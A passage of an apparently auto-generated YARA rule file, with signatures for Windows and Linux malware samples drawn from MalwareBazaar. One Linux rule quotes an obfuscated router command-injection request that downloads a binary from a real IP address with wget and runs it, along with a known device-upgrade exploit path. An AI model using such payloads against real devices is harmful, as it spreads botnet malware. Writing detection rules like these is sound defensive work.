        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetUserObjectInformationA"
        $s17 = "GetLastActivePopup"
        $s18 = "GetActiveWindow"
        $s19 = "USER32.DLL"
        $s20 = "`local static thread guard'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 239KB and
        all of them
}

rule Windows_035f80e34dc781f15ce459e8e40683ad7e1d9fbd6f7ac4461d6cfde34cc8edb0
{
    meta:
        description = "Auto ML: 035f80e34dc781f15ce459e8e40683ad7e1d9fbd6f7ac4461d6cfde34cc8edb0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 301KB and
        all of them
}

rule Windows_2a2e1343b36220e91af7737f576c2204957577bd61694f7fde538a97da9d4994
{
    meta:
        description = "Auto ML: 2a2e1343b36220e91af7737f576c2204957577bd61694f7fde538a97da9d4994"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "KERNEL32.DLL"
        $s3 = "COMCTL32.dll"
        $s4 = "MSIMG32.dll"
        $s5 = "MSVCRT.dll"
        $s6 = "MSVFW32.dll"
        $s7 = "USER32.dll"
        $s8 = "LoadLibraryA"
        $s9 = "GetProcAddress"
        $s10 = "DrawDibOpen"
        $s11 = "GetDC"
        $s12 = "SkinH_EL.dll"
        $s13 = "SkinH_GetColor"
        $s14 = "SkinH_SetAero"
        $s15 = "SkinH_SetBackColor"
        $s16 = "SkinH_SetFont"
        $s17 = "SkinH_SetFontEx"
        $s18 = "SkinH_SetForeColor"
        $s19 = "SkinH_SetMenuAlpha"
        $s20 = "SkinH_SetTitleMenuBar"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 683KB and
        all of them
}

rule Linux_2a3e1d32ae10f16c2cb42a29e915ca4776283bc4ee08a7981dd94fafd84d2962
{
    meta:
        description = "Auto ML: 2a3e1d32ae10f16c2cb42a29e915ca4776283bc4ee08a7981dd94fafd84d2962"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 57KB and
        all of them
}

rule Windows_2a707ff6a4840639e838d39cc367333bb92da01d39642002c1d26e26889df119
{
    meta:
        description = "Auto ML: 2a707ff6a4840639e838d39cc367333bb92da01d39642002c1d26e26889df119"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "SEtZ"
        $s6 = "KGet\\"
        $s7 = "p=CmdE"
        $s8 = "CSETjE"
        $s9 = "CorExitProcess"
        $s10 = "An application has made an attempt to load the C runtime library incorrectly."
        $s11 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s12 = "- Attempt to initialize the CRT more than once."
        $s13 = "- unable to open console device"
        $s14 = "- unexpected multithread lock error"
        $s15 = "- not enough space for thread data"
        $s16 = "- floating point support not loaded"
        $s17 = "FlsSetValue"
        $s18 = "FlsGetValue"
        $s19 = "GetProcessWindowStation"
        $s20 = "GetUserObjectInformationA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 704KB and
        all of them
}

rule Linux_2a8d8f5e6738fdbf56c271c971f87a8caf5682d39d33fe12aa99ec4760f06a3a
{
    meta:
        description = "Auto ML: 2a8d8f5e6738fdbf56c271c971f87a8caf5682d39d33fe12aa99ec4760f06a3a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "4:ZYTS"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 54KB and
        all of them
}

rule Windows_2aa569b95d506b163ce498b9bb864a28b560029c574b1abd4558016d26a0093d
{
    meta:
        description = "Auto ML: 2aa569b95d506b163ce498b9bb864a28b560029c574b1abd4558016d26a0093d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "<Module>"
        $s4 = "ShellCode"
        $s5 = "GetTypeFromHandle"
        $s6 = "ProcessHandle"
        $s7 = "hFile"
        $s8 = "WriteLine"
        $s9 = "MapLocalSectionAndWrite"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "System.Runtime.Versioning"
        $s13 = "ntdll.dll"
        $s14 = "System"
        $s15 = "NtCreateSection"
        $s16 = "System.Reflection"
        $s17 = "GetDelegateForFunctionPointer"
        $s18 = "System.Diagnostics"
        $s19 = "System.Runtime.InteropServices"
        $s20 = "System.Runtime.CompilerServices"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 305KB and
        all of them
}

rule Windows_2aef241c8c48579042670ef2dc6f1cf81fb9b83528c00332daae95950e97dd41
{
    meta:
        description = "Auto ML: 2aef241c8c48579042670ef2dc6f1cf81fb9b83528c00332daae95950e97dd41"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s6 = "System.Drawing.Point"
        $s7 = "System.Drawing.Icon"
        $s8 = "System.Drawing.Size"
        $s9 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s10 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADP"
        $s11 = "System.Drawing.Bitmap"
        $s12 = "hHrd.exe"
        $s13 = "System.Runtime.CompilerServices"
        $s14 = "<Module>"
        $s15 = "kernel32.dll"
        $s16 = "System"
        $s17 = "Module"
        $s18 = "System.Reflection"
        $s19 = "System.IO"
        $s20 = "System.Resources"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 696KB and
        all of them
}

rule Windows_2ba1dac82b3bf5323019fc2518ba2d1cadf1b09f4c258a6b2cc794740b61aba8
{
    meta:
        description = "Auto ML: 2ba1dac82b3bf5323019fc2518ba2d1cadf1b09f4c258a6b2cc794740b61aba8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = ".reloc"
        $s6 = "SystemFuH"
        $s7 = "RtlGetCuH"
        $s8 = "tlGetCurH"
        $s9 = "RtlGetNtH"
        $s10 = "WSAGetOvH"
        $s11 = "wine_getH"
        $s12 = "GetSysteH"
        $s13 = "time.DatH"
        $s14 = ";fileu"
        $s15 = "?fileumH"
        $s16 = ":windu"
        $s17 = "8windu fA"
        $s18 = "8open"
        $s19 = "9fileu"
        $s20 = ">fileuF"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5775KB and
        all of them
}

rule Windows_2ba23a256551d2b59785b96b6e2b79b3a1a63c3e634b6a1e2690d48c8450e80a
{
    meta:
        description = "Auto ML: 2ba23a256551d2b59785b96b6e2b79b3a1a63c3e634b6a1e2690d48c8450e80a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "<Module>"
        $s4 = "System.IO"
        $s5 = "System.Collections.Generic"
        $s6 = "Read"
        $s7 = "Thread"
        $s8 = "Load"
        $s9 = "GetTypeFromHandle"
        $s10 = "GetType"
        $s11 = "System.Core"
        $s12 = "CreateDelegate"
        $s13 = "TargetFrameworkAttribute"
        $s14 = "AssemblyFileVersionAttribute"
        $s15 = "Wpcjjjdco.exe"
        $s16 = "System.Threading"
        $s17 = "System.Runtime.Versioning"
        $s18 = "System"
        $s19 = "GetDomain"
        $s20 = "System.IO.Compression"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 595KB and
        all of them
}

rule Windows_2bceb15676d4f690c8ec549d40177cc5dd63124d44b6ebb8d1fb87adb9c514d1
{
    meta:
        description = "Auto ML: 2bceb15676d4f690c8ec549d40177cc5dd63124d44b6ebb8d1fb87adb9c514d1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Jb{M_lOad"
        $s5 = "d/kgGeT]"
        $s6 = "T/kgGeT]"
        $s7 = "d2xLCmd/ka5hV"
        $s8 = "GeT?_o1vfEIu0B~?}"
        $s9 = "|a@=U6SET7LfOJ"
        $s10 = "iIC+w/geTkU"
        $s11 = ":Kbcoke4CLC+w/geTkU"
        $s12 = "RXGETta2T9D"
        $s13 = "`GET.wbThD#a"
        $s14 = "6xSnGeT"
        $s15 = "6\"S*GETMw"
        $s16 = "a.G95,GH2)f%bGeti;k"
        $s17 = "GETEw0euD^a"
        $s18 = "6ySwGETEw0"
        $s19 = "GeTHw"
        $s20 = "6.S!GeT@wiTXD%a"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3542KB and
        all of them
}

rule Windows_2bf67ccbf4e114d641eaa81a07ccf19e248ab9008d2c3d77a5be1ce937dd0e92
{
    meta:
        description = "Auto ML: 2bf67ccbf4e114d641eaa81a07ccf19e248ab9008d2c3d77a5be1ce937dd0e92"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "GetCayDanhMucRowsByFK_CayDanhMuc_DanhMuc1"
        $s5 = "get_DanhMucRowByFK_CayDanhMuc_DanhMuc1"
        $s6 = "set_DanhMucRowByFK_CayDanhMuc_DanhMuc1"
        $s7 = "openFileDialog1"
        $s8 = "<Module>"
        $s9 = "get_NhaXB"
        $s10 = "set_NhaXB"
        $s11 = "get_DMTL"
        $s12 = "get_MaTL"
        $s13 = "set_MaTL"
        $s14 = "get_MaDM"
        $s15 = "set_MaDM"
        $s16 = "System.IO"
        $s17 = "get_WffgVeSV"
        $s18 = "get_MaDMCha"
        $s19 = "set_MaDMCha"
        $s20 = "get_TacGia"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 831KB and
        all of them
}

rule Windows_0360c06603e86eba76a783ed1599f900dbe465c99fbc44bc7c86062303d88a6b
{
    meta:
        description = "Auto ML: 0360c06603e86eba76a783ed1599f900dbe465c99fbc44bc7c86062303d88a6b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "CloseHandle"
        $s5 = "ConnectNamedPipe"
        $s6 = "CreateFileA"
        $s7 = "CreateNamedPipeA"
        $s8 = "CreateThread"
        $s9 = "DeleteCriticalSection"
        $s10 = "GetCurrentProcess"
        $s11 = "GetCurrentProcessId"
        $s12 = "GetCurrentThreadId"
        $s13 = "GetLastError"
        $s14 = "GetModuleHandleA"
        $s15 = "GetProcAddress"
        $s16 = "GetStartupInfoA"
        $s17 = "GetSystemTimeAsFileTime"
        $s18 = "GetTickCount"
        $s19 = "ReadFile"
        $s20 = "RtlVirtualUnwind"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 321KB and
        all of them
}

rule Windows_2c009fefcf337b8b5e4f0249aeb1627d3a39934097cf5fea75b16c5aa9a7f374
{
    meta:
        description = "Auto ML: 2c009fefcf337b8b5e4f0249aeb1627d3a39934097cf5fea75b16c5aa9a7f374"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<BindCreateInstance>b__10"
        $s5 = "<SaveTransmissionToFileAsync>d__10"
        $s6 = "<GetClsidChildren>d__20"
        $s7 = "<GetEnumerator>d__20"
        $s8 = "<GetFilteredFiles>d__20"
        $s9 = "<GetChildProviders>d__20"
        $s10 = "<WaitForReady>d__20"
        $s11 = "<ReadAndParseManifest>d__30"
        $s12 = "get_InvalidServerPath60"
        $s13 = "<ReadFlightsOnce>b__20_0"
        $s14 = "<GetMergedCustomAndManifestActionsInOrder>b__20_0"
        $s15 = "<GetAliasedAssemblyRefs>b__20_0"
        $s16 = "<GetFiles>b__30_0"
        $s17 = "<GetAllSamplings>b__40_0"
        $s18 = "<GetAllProperties>b__60_0"
        $s19 = "<GetSystemFirmwareTable>b__0_0"
        $s20 = "<GetDescendants>b__0_0"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7988KB and
        all of them
}

rule Windows_2c32eace1b05663b289ea1ac4dc8a8934d693ee1fc1e178ed1f8052dbb3f3b98
{
    meta:
        description = "Auto ML: 2c32eace1b05663b289ea1ac4dc8a8934d693ee1fc1e178ed1f8052dbb3f3b98"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 305KB and
        all of them
}

rule Linux_2c683501e18c3e736ad71552757f6e79564f0a0942a51ad8a208c291b5918dfd
{
    meta:
        description = "Auto ML: 2c683501e18c3e736ad71552757f6e79564f0a0942a51ad8a208c291b5918dfd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "OpenSUSE"
        $s2 = "OpenWRT"
        $s3 = "processor"
        $s4 = "/sys/devices/system/cpu"
        $s5 = "attempts"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 105KB and
        all of them
}

rule Linux_2c94de84088e1ebc5b4fd4a32fbe6b2f4b9526aa0ebf8a4b534a06a016b460e5
{
    meta:
        description = "Auto ML: 2c94de84088e1ebc5b4fd4a32fbe6b2f4b9526aa0ebf8a4b534a06a016b460e5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "connect"
        $s2 = "sigemptyset"
        $s3 = "getpid"
        $s4 = "readlink"
        $s5 = "socket"
        $s6 = "readdir"
        $s7 = "sigaddset"
        $s8 = "write"
        $s9 = "setsockopt"
        $s10 = "read"
        $s11 = "memset"
        $s12 = "getppid"
        $s13 = "opendir"
        $s14 = "getsockopt"
        $s15 = "open"
        $s16 = "setsid"
        $s17 = "closedir"
        $s18 = "close"
        $s19 = "getsockname"
        $s20 = ".text"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 62KB and
        all of them
}

rule Windows_2cab1566a89734389b4cdf0e311d947a7c64c62bd9557cd72f5921fc721432e4
{
    meta:
        description = "Auto ML: 2cab1566a89734389b4cdf0e311d947a7c64c62bd9557cd72f5921fc721432e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "System"
        $s6 = "kernel32.dll"
        $s7 = "GetLongPathNameA"
        $s8 = "Windows"
        $s9 = "TFileName"
        $s10 = "TThreadLocalCounter"
        $s11 = "$TMultiReadExclusiveWriteSynchronizer"
        $s12 = "GetDiskFreeSpaceExA"
        $s13 = "oleaut32.dll"
        $s14 = "VariantChangeTypeEx"
        $s15 = "EVariantArrayCreateError"
        $s16 = "IOleWindowT"
        $s17 = "bdRightToLeftReadingOnly"
        $s18 = "EFileStreamError"
        $s19 = "EFCreateError"
        $s20 = "EFOpenError\\xA"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 1259KB and
        all of them
}

rule Windows_2d05f675e7c06601137fb08a475d8f0483847a3ec9b296952c7045fc1b6be689
{
    meta:
        description = "Auto ML: 2d05f675e7c06601137fb08a475d8f0483847a3ec9b296952c7045fc1b6be689"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 204KB and
        all of them
}

rule Windows_2d4e78ac81b6f5f1c75db900ac1bd0f2dbd22918808694977565b6bf436d827d
{
    meta:
        description = "Auto ML: 2d4e78ac81b6f5f1c75db900ac1bd0f2dbd22918808694977565b6bf436d827d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "DbSet`1"
        $s5 = "HashSet`1"
        $s6 = "<Module>"
        $s7 = "getUserID"
        $s8 = "GetAccountByUserID"
        $s9 = "System.IO"
        $s10 = "System.Data"
        $s11 = "LoadData"
        $s12 = "System.Collections.Generic"
        $s13 = "GetChiTieuByUserId"
        $s14 = "userId"
        $s15 = "btnRead"
        $s16 = "Form1_Load"
        $s17 = "Form2_Load"
        $s18 = "add_Load"
        $s19 = "btnLoad"
        $s20 = "get_Checked"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 812KB and
        all of them
}

rule Windows_2d9a0704386d3f8838cb40d5f22952c2708e98cb9e359e0c3e106b617c26de64
{
    meta:
        description = "Auto ML: 2d9a0704386d3f8838cb40d5f22952c2708e98cb9e359e0c3e106b617c26de64"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_tJCfdGLH"
        $s6 = "System.IO"
        $s7 = "System.Collections.Generic"
        $s8 = "connectionId"
        $s9 = "Thread"
        $s10 = "Load"
        $s11 = "_contentLoaded"
        $s12 = "get_Checked"
        $s13 = "set_Enabled"
        $s14 = "set_FormattingEnabled"
        $s15 = "System.Collections.Specialized"
        $s16 = "ReadToEnd"
        $s17 = "set_Method"
        $s18 = "CreateInstance"
        $s19 = "get_Source"
        $s20 = "set_Source"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 634KB and
        all of them
}

rule Linux_2ddbb4fb5b044685b0c395f1bc585167d4093cff951a404e450c8e11849bf026
{
    meta:
        description = "Auto ML: 2ddbb4fb5b044685b0c395f1bc585167d4093cff951a404e450c8e11849bf026"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%s/cmdline"
        $s9 = "/bin/systemd"
        $s10 = "/var/Challenget"
        $s11 = "[killer] Failed to create child process."
        $s12 = "deleted"
        $s13 = "payloadasdf"
        $s14 = "GET /%s HTTP/1.0"
        $s15 = "User-Agent: Update v1.0"
        $s16 = "GET /bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://103.110.33.164/mips;${IFS}chmod${IFS}777${IFS}mips;${IFS}./mips${IFS}zyxel.selfrep;"
        $s17 = "No such file or directory"
        $s18 = "No such process"
        $s19 = "Interrupted system call"
        $s20 = "Bad file descriptor"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 203KB and
        all of them
}

rule Windows_2dfc49dd156ddbc9999f327d2577ecb7f573f15bd03903f3795e1319d21b0ec3
{
    meta:
        description = "Auto ML: 2dfc49dd156ddbc9999f327d2577ecb7f573f15bd03903f3795e1319d21b0ec3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USet"
        $s6 = "CorExitProcess"
        $s7 = "An application has made an attempt to load the C runtime library incorrectly."
        $s8 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s9 = "- Attempt to initialize the CRT more than once."
        $s10 = "- unable to open console device"
        $s11 = "- unexpected multithread lock error"
        $s12 = "- not enough space for thread data"
        $s13 = "- floating point support not loaded"
        $s14 = "FlsSetValue"
        $s15 = "FlsGetValue"
        $s16 = "SystemFunction036"
        $s17 = "ADVAPI32.DLL"
        $s18 = "GetProcessWindowStation"
        $s19 = "GetUserObjectInformationA"
        $s20 = "GetLastActivePopup"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 294KB and
        all of them
}

rule Linux_03888813079d01e1ba2d2675cf35724e529d58a78b9efd8161c746e8e33c643d
{
    meta:
        description = "Auto ML: 03888813079d01e1ba2d2675cf35724e529d58a78b9efd8161c746e8e33c643d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "8fileu"
        $s2 = "9windu"
        $s3 = ":windu"
        $s4 = "open"
        $s5 = ":fileu"
        $s6 = ";fileup"
        $s7 = "9fileu"
        $s8 = ">fileu("
        $s9 = "9httpu"
        $s10 = "9httpuN"
        $s11 = "http"
        $s12 = "httpu"
        $s13 = "9httpu."
        $s14 = ":httpu"
        $s15 = "HTTPuA"
        $s16 = "?httpu"
        $s17 = "8httpu"
        $s18 = ":httpuF"
        $s19 = ";read"
        $s20 = "HTTPu*"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 4480KB and
        all of them
}

rule Windows_2e08721f791305935eb167081cc4dc13b58297d3810ef998026c7a0a59f00f40
{
    meta:
        description = "Auto ML: 2e08721f791305935eb167081cc4dc13b58297d3810ef998026c7a0a59f00f40"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 302KB and
        all of them
}

rule Windows_2e0ffaab995f22b7684052e53b8c64b9283b5e81503b88664785fe6d6569a55e
{
    meta:
        description = "Auto ML: 2e0ffaab995f22b7684052e53b8c64b9283b5e81503b88664785fe6d6569a55e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "ios_base::failbit set"
        $s7 = "ios_base::eofbit set"
        $s8 = "ios_base::badbit set"
        $s9 = "map/set too long"
        $s10 = "text file busy"
        $s11 = "no such file or directory"
        $s12 = "GetDateFormatEx"
        $s13 = "GetTimeFormatEx"
        $s14 = "EnumSystemLocalesEx"
        $s15 = "GetLocaleInfoEx"
        $s16 = "connection reset"
        $s17 = "network reset"
        $s18 = "not a socket"
        $s19 = "file exists"
        $s20 = "connection already in progress"
    condition:
        uint32(0) == 0x00785a4d and
        filesize < 16138KB and
        all of them
}

rule Linux_2eb4a525dd3c839e2e3641694d1061eb361fa6e9ada59fcb576669114ef75653
{
    meta:
        description = "Auto ML: 2eb4a525dd3c839e2e3641694d1061eb361fa6e9ada59fcb576669114ef75653"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = ".text"
        $s5 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB and
        all of them
}

rule Linux_2eecf28243d6d408618437ea849b67a504e2255082e36ba385f87f7b68d79f43
{
    meta:
        description = "Auto ML: 2eecf28243d6d408618437ea849b67a504e2255082e36ba385f87f7b68d79f43"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36"
        $s4 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
        $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
        $s6 = "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
        $s7 = "dayzddos.co runs you if you read this lol then you tcp dumped it because it hit you and you need to patch it lololololol"
        $s8 = "%s %s HTTP/1.1"
        $s9 = "User-Agent: %s"
        $s10 = "Connection: close"
